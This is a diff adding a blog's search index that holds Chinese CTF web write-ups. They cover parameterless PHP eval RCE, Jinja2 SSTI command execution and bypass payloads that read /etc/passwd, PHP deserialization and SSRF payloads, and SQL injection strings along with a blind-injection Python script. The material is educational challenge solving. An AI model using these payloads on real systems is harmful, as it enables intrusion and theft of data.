@@ -1,0 +1,405 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>[GXYCTF2019]禁止套娃</title>
+      <link href="/2020/08/28/gxyctf2019-jin-zhi-tao-wa/"/>
+      <url>/2020/08/28/gxyctf2019-jin-zhi-tao-wa/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h2><p>dirb扫出.git源码泄露，使用Githack将源码下载下来</p><pre><code>&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123;    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;                // echo $_GET[&#39;exp&#39;];                @eval($_GET[&#39;exp&#39;]);            &#125;            else&#123;                die(&quot;还差一点哦！&quot;);            &#125;        &#125;        else&#123;            die(&quot;再好好想想！&quot;);        &#125;    &#125;    else&#123;        die(&quot;还想读flag，臭弟弟！&quot;);    &#125;&#125;// highlight_file(__FILE__);?&gt;</code></pre><p>定位到<code>@eval($_GET[&#39;exp&#39;])</code>，发现它使用了一个非常危险的函数，利用这个函数我们可以进行代码执行。但是正则过滤了一些伪协议，并且限制了传入exp的值为a(b(c(d()))这种形式，并且函数里不能出现参数（不是禁止套娃吗？？？）。<br>这就想到了无参数的RCE，一步步定位flag。</p><ul><li>首先想到用<code>scandir()</code>函数来获取文件数组，但是由于里面不能传入参数，那么可以用到<code>localeconv()</code>函数来返回一个数组，获取到数组之后使用<code>current()</code>函数来返回数组的值，并打印出来。<br>payload：<code>?exp=var_dump(scandir(current(localeconv())))</code><br><img src="https://i.loli.net/2020/08/28/qWHgKTY1ZjxQ3ld.png"></li><li>找到存放flag的文件之后我们可以使用<code>highlight_file()</code>函数将文件内容读取出来，但在此之前我们需要定位到flag.php这个文件，我们看到flag.php是倒数第二个元素，那么我们可以使用<code>array_reverse()</code>函数将数组中的元素翻转，然后使用<code>next()</code>函数定位到flag.php。<br>payload：<code>?exp=var_dump(next(array_reverse(scandir(current(localeconv())))));</code><br><img src="https://i.loli.net/2020/08/28/iCmQc6IagMd9HU8.png"></li><li>打印出flag，payload：<code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code><br><img src="https://i.loli.net/2020/08/28/hfnbFaA2tzoNpKk.png"><h2 id="0x01知识点"><a href="#0x01知识点" class="headerlink" title="0x01知识点"></a>0x01知识点</h2></li></ul><p><strong>无参数代码执行<br>函数：</strong></p><pre><code>scandir(directory[,sorting_order][,context]); //若成功则返回文件和目录的数组，失败则返回FALSE。localeconv()函数返回一包含本地数字及货币格式信息的数组。current()函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的&quot;当前&quot;元素，初始指向插入到数组中的第一个元素。next()函数将内部指针指向数组中的下一个元素，并输出。array_reverse()函数以相反的元素顺序返回数组。highlight_file()函数对文件进行语法高亮显示，show_source()函数是其别名。var_dump() 函数用于输出变量的相关信息。函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 代码审计 </tag>
+            
+            <tag> RCE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[BJDCTF 2nd]fake google</title>
+      <link href="/2020/08/28/bjdctf-2nd-fake-google/"/>
+      <url>/2020/08/28/bjdctf-2nd-fake-google/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h2><p>随意输入，直接将输入的东西打印出来<br><img src="https://i.loli.net/2020/08/28/sAduoMbpkDaqgJB.png"><br>右键查看源码，提示得很明显，ssti模板注入<br><img src="https://i.loli.net/2020/08/28/mjesVIic6BOkfSC.png"><br>我们来测试一下，传入<img src="https://i.loli.net/2020/08/28/RNkn7jWyKwC8Dam.png">根据回显确实存在ssti模板注入<br><img src="https://i.loli.net/2020/08/28/MYxI75KkjPNZELg.png"><br>查看类元组：<code>&#39;&#39;.__class__.__mro__</code>，基本类object是第二个元素<br><img src="https://i.loli.net/2020/08/28/35lEUnoXYS9RzvW.png"><br>获取基本类：<code>&#39;&#39;.__class__.__mro__[1]</code><br><img src="https://i.loli.net/2020/08/28/laKm2qibEr9tch5.png"><br>获取基本类的子类：<code>&#39;&#39;.__class__.__mro__[1].__subclasses__()</code><br><img src="https://i.loli.net/2020/08/28/nzYDVMOZkhNHFro.png"><br>找到重载过的__init__类(在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)：<code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[300].__init__</code><br><img src="https://i.loli.net/2020/08/28/gLmODj9oVRzAG5l.png"><br>查看其引用：<code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__.__builtins__</code><br><img src="https://i.loli.net/2020/08/28/1uwXOBVHoLq384T.png"><br>命令执行：<code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()</code><br><img src="https://i.loli.net/2020/08/28/NjhasDT4ZoB1Hew.png"><br>根据提示得知，flag在根目录里，查看flag：<code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code><br><img src="https://i.loli.net/2020/08/28/fQk7tdOapcECXn3.png"></p><h2 id="0x01知识点"><a href="#0x01知识点" class="headerlink" title="0x01知识点"></a>0x01知识点</h2><p><strong>SSTI(Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。<br>函数：</strong></p><pre><code>__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__   返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法（找到重载过的__init__类(在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)）__globals__  对包含函数全局变量的字典的引用__dict__ 保存类实例或对象实例的属性变量键值对字典__bases__ 返回类型列表__builtins__查看其引用</code></pre><h2 id="0x02常见绕过方式"><a href="#0x02常见绕过方式" class="headerlink" title="0x02常见绕过方式"></a>0x02常见绕过方式</h2><p>以下内容转载自：<a href="https://bbs.ichunqiu.com/thread-47685-1-1.html">https://bbs.ichunqiu.com/thread-47685-1-1.html</a></p><h3 id="绕过中括号"><a href="#绕过中括号" class="headerlink" title="绕过中括号"></a>绕过中括号</h3><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()&#39;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/sp</code></pre><p>在这里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过。</p><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p><code>request.args</code>是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。</p><pre><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd</code></pre><h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h3><p>同样利用<code>request.args</code>属性。</p><pre><code>&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p><pre><code>GET:&#123;&#123; ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() &#125;&#125;POST:class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><p><code>__getattribute__</code>使用实例访问属性时,调用该方法<br>例如被过滤掉<code>__class__</code>关键词</p><pre><code>&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></pre><h4 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h4><pre><code>&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></pre><p>相关链接：<br><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html">https://bbs.ichunqiu.com/thread-47685-1-1.html</a><br><a href="https://www.cnblogs.com/tiaopidejun/p/12357245.html">https://www.cnblogs.com/tiaopidejun/p/12357245.html</a><br><a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> python模板注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
+      <link href="/2020/08/27/wang-ding-bei-2020-qing-long-zu-areuserialz/"/>
+      <url>/2020/08/27/wang-ding-bei-2020-qing-long-zu-areuserialz/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h2><p>上来直接给源码：</p><pre><code>&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;</code></pre><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><ol><li>直接定位到最后，php反序列化漏洞。以get方式传入序列化后的参数str，并将其反序列化，str值的每一个字符ascii码都要在32~125之间。<pre><code>function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++)     if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))         return false; return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123; $str = (string)$_GET[&#39;str&#39;]; if(is_valid($str)) &#123;     $obj = unserialize($str); &#125;&#125;</code></pre></li><li>反序列化之后销毁对象自动调用<code>__destruct()</code>方法，如果op等于字符型的”2”（强类型比较），op赋值为1，进入process之后调用<code>write()</code>方法，可以利用这个方法来传马，但是我们不使用这种方法。<pre><code>function __destruct() &#123;     if($this-&gt;op === &quot;2&quot;)         $this-&gt;op = &quot;1&quot;;     $this-&gt;content = &quot;&quot;;     $this-&gt;process();&#125;</code></pre>来看看<code>process()</code>方法：<pre><code>public function process() &#123;     if($this-&gt;op == &quot;1&quot;) &#123;         $this-&gt;write();     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;         $res = $this-&gt;read();         $this-&gt;output($res);     &#125; else &#123;         $this-&gt;output(&quot;Bad Hacker!&quot;);     &#125; &#125;</code></pre></li><li>我们发现process方法中如果op等于”2”（弱类型比较），调用<code>read()</code>方法，在read方法中又使用到了<code>file_get_contents()</code>函数，那么就可以使用<code>php://fileter</code>来进行任意文件读取，并在<code>output()</code>方法中输出结果。<pre><code>private function read() &#123;     $res = &quot;&quot;;     if(isset($this-&gt;filename)) &#123;         $res = file_get_contents($this-&gt;filename);     &#125;     return $res; &#125;</code></pre></li></ol><h3 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h3><ol><li>如何通过传入op的值来进入<code>read()</code>方法；</li><li>如何读取出源码内容；</li><li>由于类属性是protected权限，序列化时protected权限格式为 %00*%00属性名：<pre><code>O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;i:2;s:11:&quot;%00*%00filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;%00*%00content&quot;;N;&#125;//%00为我们自行添加，因为浏览器无法显示出来%00</code></pre>这就相当于在属性名前添加了ascii码为0的字符，而<code>is_valid()</code>函数限制了ascii码的范围，如何绕过。</li></ol><h3 id="解决问题（绕过）"><a href="#解决问题（绕过）" class="headerlink" title="解决问题（绕过）"></a>解决问题（绕过）</h3><ol><li>我们可以让传入的op值为int型的2来绕过强类型比较和弱类型比较进入<code>read()</code>方法；</li><li>利用php://filter协议读取flag文件源码；</li><li>PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过。<br>脚本：<pre><code>&lt;?phpclass FileHandler&#123; public $op=2; public $filename=&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;; public $content;&#125;$str = new FileHandler();echo serialize($str);?&gt;//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></pre>payload：<pre><code>?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></pre>base64解码得到flag<br><img src="https://i.loli.net/2020/08/27/teMxYV6pON71Hfy.png"></li></ol><h2 id="0x02知识点"><a href="#0x02知识点" class="headerlink" title="0x02知识点"></a>0x02知识点</h2><p><strong>1.php反序列化漏洞；<br>2.php弱类型比较；<br>3.php://filter伪协议读取文件源码。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 代码审计 </tag>
+            
+            <tag> php反序列化 </tag>
+            
+            <tag> php伪协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[网鼎杯 2018]Fakebook</title>
+      <link href="/2020/08/26/wang-ding-bei-2018-fakebook/"/>
+      <url>/2020/08/26/wang-ding-bei-2018-fakebook/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h2><p>打开页面有注册和登录，并且登陆进去之后还能点击用户名查看，种种特征都符合二次注入，但它偏偏就不是…(当然也有可能是ssrf，因为查看用户的时候在那个页面中返回了用户博客页面)在查看用户的页面发现传入了参数<code>no=1</code>，加上<code>and 1=1</code>页面显示正常，加上<code>and 1=2</code>报错，数字型注入没跑了。<br><img src="https://i.loli.net/2020/08/26/wasNZWt8Ejerumb.png"><br>fuzz了一下关键字发现它并没有明显的提示，所以无法明确知道它过滤了哪些关键字。<code>order by</code>查出列数为4，但是使用联合查询<code>union select 1,2,3,4</code>无法访问，猜测可能是有waf，试着用双写绕过、大小写绕过、内联注释(后端过滤)都不可以。将union和select之间的空格用注释符<code>/**/</code>替换绕过成功，猜测waf很有可能直接将union和select之间的空格替换或者去除掉了。回显在2那里。<br><img src="https://i.loli.net/2020/08/26/qhBXTliuKAZ7IoN.png"><br>爆数据库：</p><pre><code>?no=-1 union/**/select 1,database(),3,4</code></pre><p><img src="https://i.loli.net/2020/08/26/InifSgeNFRcJaxj.png"><br>爆表名：</p><pre><code>?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;</code></pre><p><img src="https://i.loli.net/2020/08/26/jUWYdbvChAEL6Rw.png"><br>爆字段名：</p><pre><code>?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;</code></pre><p><img src="https://i.loli.net/2020/08/26/nz3kJwFa9G5vqKC.png"><br>爆字段值，在data中发现是序列化后的值，也就是说view.php会对查询到的值进行反序列化。</p><pre><code>?no=-1 union/**/select 1,group_concat(data),3,4 from users</code></pre><p><img src="https://i.loli.net/2020/08/26/h4iXrFcjEWgKRA5.png"><br>序列化一般会给我们源码，扫一下目录发现了robots.txt，在其中发现了源码备份<br><img src="https://i.loli.net/2020/08/26/uf37JdlD6FyHOVt.png"><br>源码：</p><pre><code>&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;    function get($url)    &#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) &#123;            return 404;        &#125;        curl_close($ch);        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);    &#125;&#125;</code></pre><p>该文件主要是定义了一个用户类，当调用get方法时会访问某个url得到信息，如果该url被恶意利用，比如利用file协议，就可以读取任意文件。很明显的ssrf了。<br>脚本：</p><pre><code>&lt;?phpclass UserInfo&#123;    public $name = &quot;admin&quot;;    public $age = 0;    public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;$no = new UserInfo();$no = serialize($no);echo $no;?&gt;//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code></pre><p>由于blog是在第4列，payload：</p><pre><code>?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39; from users</code></pre><p>在源码的iframe标签中找到flag.php源码<br><img src="https://i.loli.net/2020/08/26/z5OQr42SguHwYqB.png"><br><img src="https://i.loli.net/2020/08/26/zPluKbkhqpd5ZL8.png"></p><ul><li>总结一下本题思路：</li></ul><p>1.通过注入发现data的数据是序列化的<br>2.通过后台获取源码，代码审计存在可利用的ssrf点<br>3.结合反序列化和ssrf，保证bypass可以被利用，读取flag.php中的flag</p><h2 id="0x02知识点"><a href="#0x02知识点" class="headerlink" title="0x02知识点"></a>0x02知识点</h2><p><strong>1.ssrf漏洞<br>2.sql注入之联合查询注入（报错注入应该也可以）<br>3.反序列化漏洞</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> SQL注入 </tag>
+            
+            <tag> php反序列化 </tag>
+            
+            <tag> ssrf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[极客大挑战 2019]HardSQL</title>
+      <link href="/2020/08/26/ji-ke-da-tiao-zhan-2019-hardsql/"/>
+      <url>/2020/08/26/ji-ke-da-tiao-zhan-2019-hardsql/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h2><p>大佬的网站又被日了于是重新做了一个但还是逃脱不了被日的命运。SQL注入，fuzz一下关键字，发现很多都被大佬过滤了。<br><img src="https://i.loli.net/2020/08/26/3GC4rmISW9LEf6j.png"><br>可以使用报错注入，这里用<code>updatexml()</code>函数进行报错注入。其中and和=被过滤了，分别用or和like来代替。<br>爆库：</p><pre><code>?username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=123</code></pre><p><img src="https://i.loli.net/2020/08/26/5wz37ZKDTC4WJSo.png"><br>爆表：</p><pre><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=123</code></pre><p><img src="https://i.loli.net/2020/08/26/KcbujGgQRzCJmky.png"><br>爆字段名：</p><pre><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23&amp;password=123</code></pre><p><img src="https://i.loli.net/2020/08/26/7PIruyOzTipRGDQ.png"><br>爆flag：</p><pre><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code></pre><p><img src="https://i.loli.net/2020/08/26/MTYpZy5x7mdCSfi.png"><br>这里flag只出了一部分，因为不管是updatexml()函数还是extractvalue()函数，一次最多只能显示32位。mid()函数被禁，但是right()函数还能使用。<br>爆下半部分flag：</p><pre><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,23))))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code></pre><p><img src="https://i.loli.net/2020/08/26/BtInma31TzHFfNY.png"></p><h2 id="0x02知识点"><a href="#0x02知识点" class="headerlink" title="0x02知识点"></a>0x02知识点</h2><p><strong>1.报错注入。<br>报错原因：其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。<br>2.LEFT()函数和RIGHT()函数。<br>语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)。<br>LEFT、RIGHT函数分别返回ARG最左边、右边的LENGTH个字符串，ARG可以是CHAR或BINARY STRING。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[CISCN2019 华北赛区 Day2 Web1]Hack World</title>
+      <link href="/2020/08/24/ciscn2019-hua-bei-sai-qu-day2-web1-hack-world/"/>
+      <url>/2020/08/24/ciscn2019-hua-bei-sai-qu-day2-web1-hack-world/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h2><p>打开页面直接告诉我们flag在flag表中的flag列，很明显的sql注入了，当输入<code>1&#39;</code>时回显bool(false)，输入<code>1=1</code>时返回输入1的结果，输入<code>1=2</code>时报错，是数字型注入没错了。fuzz一下关键字全部被过滤。<br>记录一些关键字过滤的绕过方法：union过滤，可以用/*!union*/来绕过；or过滤，可以用^异或符号来绕过；空格过滤，可以用括号绕过。<br>但是本题过滤的关键字实在太多，所以换一种思路注入。由于<code>^</code>没有被过滤，尝试输入<code>1^0</code>时返回的结果和输入1的相同。<br><img src="https://i.loli.net/2020/08/24/nYPdrmAuSRtb721.png"><br>这里可以用到异或注入+盲注，payload：<code>id=1^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</code></p><pre><code>ascii(string):取字符串第一个的字符的ascii；substr(string, start[, len]):切割（mysql里的substr的start是从1开始），substr的len可以无限大，这个不影响。</code></pre><p>根据<code>(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</code>的值来进行异或，这个值为1或者0，再和1进行异或，根据页面回显即可判断出最终flag。<br>破烂屎山脚本直接跑出flag（网速快几分钟，网速慢十来分钟，可能还会被中断，2333）：</p><pre><code>import requestsurl = &#39;http://e78695e7-269e-403e-a58e-dd5c278c3a64.node3.buuoj.cn/index.php&#39;result = &#39;&#39;headers = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.7 Safa&#39;                  &#39;ri/537.36&#39;&#125;for i in range(1, 38):    for j in range(1, 255):        id = &#39;1^(ascii(substr((select(flag)from(flag)),&#39; + str(i) + &#39;,1))&gt;&#39; + str(j) + &#39;)&#39;        data = &#123;            &#39;id&#39;: id        &#125;        response = requests.post(url=url, data=data, headers=headers)        page_text = response.text        if &#39;glzjin&#39; in page_text:            result = result + chr(j)            print(result)            break</code></pre><h2 id="0x01知识点"><a href="#0x01知识点" class="headerlink" title="0x01知识点"></a>0x01知识点</h2><p><strong>异或注入之^位异或运算</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[BJDCTF2020]Easy MD5</title>
+      <link href="/2020/08/23/bjdctf2020-easy-md5/"/>
+      <url>/2020/08/23/bjdctf2020-easy-md5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h2><p>打开题目，输入框中随便输入，是get请求，参数password。由此猜测是sql注入，在响应头中发现了sql语句<br><img src="https://i.loli.net/2020/08/24/ya5jfnE4owG6YSP.png"><br>这里的关键是<code>md5(string[, raw])</code>函数。第一个参数string是必需的，规定要计算的字符串。第二个参数为可选参数，规定十六进制或二进制输出格式（TRUE-原始16字符二进制格式；FALSE-&lt;默认&gt;32字符十六进制数）。<strong>当md5函数的第二个参数为true时，该函数的输出是原始二进制格式，会被作为字符串处理。</strong>那么我们只需要提交特定字符串，让其md<br>5值以原始二进制格式输出（被当作字符串）时含有能触发SQL注入的特殊字符即可。<br>这里列出两个这样的特定字符串：</p><pre><code>被编码的字符串：129581926211651571912466741651878684928经过md5编码后：06da5430449f8f6f23dfc1276f722738再转化为字符串：&lt;trash&gt;&#39;or&#39;8拼接后的sql语句：select * from &#39;admin&#39; where password=&#39;&lt;trash&gt;&#39;or&#39;8被编码的字符串：ffifdyop经过md5编码后：276f722736c95d99e921722cf9ed621c再转化为字符串：&#39;or&#39;6&lt;trash&gt;拼接后的sql语句：select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6&lt;trash&gt;&#39;</code></pre><p>这里我们输入<code>ffifdyop</code>即可绕过<br><img src="https://i.loli.net/2020/08/24/bGPed39EigJLM6X.png"><br>No!I don’t like…查看源码</p><pre><code>$a = $GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123;    // wow, glzjin wants a girl friend.</code></pre><p>很明显的php弱类型比较</p><ul><li>方法一：找两个md5值开头为0e的字符串传入。原理：php里面在做 == 